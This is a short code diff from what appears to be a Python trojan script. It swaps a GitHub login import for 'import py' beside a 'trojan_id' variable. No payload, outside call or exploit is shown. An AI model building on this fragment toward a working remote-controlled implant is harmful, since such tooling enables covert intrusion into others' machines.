@@ -7,7 +7,7 @@ import random
 import threading
 import Queue
 import os
-from github3 import login
+import py
 
 trojan_id = "abc"
 
